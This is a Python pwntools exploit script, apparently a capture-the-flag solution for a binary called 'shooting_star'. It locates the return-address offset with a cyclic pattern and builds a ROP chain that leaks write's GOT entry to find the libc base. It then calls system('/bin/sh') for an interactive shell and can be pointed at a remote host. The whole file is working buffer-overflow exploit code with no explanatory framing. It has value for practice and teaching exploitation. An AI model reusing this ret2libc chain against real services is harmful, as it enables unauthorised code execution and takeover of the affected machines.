from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './shooting_star'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# This is the same binary used on server, identified and downloaded using: https://libc.blukat.me
# libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')  # Remote

# Create a ROP object to handle complexities
rop = ROP(elf)

# Need pop RSI to put got.write address in (before leaking via plt.write)
pop_rsi_r15 = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]  # pop rsi; pop r15; ret;
info("%#x pop_rsi_r15", pop_rsi_r15)

# Payload to leak the got.write address
# TODO: Should be able to do this with rop.call(elf.plt.write, [elf.got.write])?
rop.raw([pop_rsi_r15, elf.got.write, 0x0, elf.plt.write, elf.symbols.main])

# Build the payload
payload = flat(
    {offset: rop.chain()}
)

# Send the payload
io.sendlineafter('>', '1')
io.sendlineafter('>>', payload)
io.recvuntil('May your wish come true!\n')

# Get our leaked got.write address and format it
leaked_addr = io.recv()
got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
info("leaked got_write: %#x", got_write)

# Set the libc_base_addr using the offsets
libc.address = got_write - libc.symbols.write
info("libc_base: %#x", libc.address)

# Reset ROP object with libc binary
rop = ROP(libc)

# Call ROP system, passing location of "/bin/sh" string
rop.system(next(libc.search(b'/bin/sh\x00')))

# Final Payload
payload = flat(
    {offset: rop.chain()}
)

# Send the payload
io.sendline('1')
io.sendlineafter('>>', payload)
io.recvuntil('May your wish come true!\n')

# Got Shell?
io.interactive()
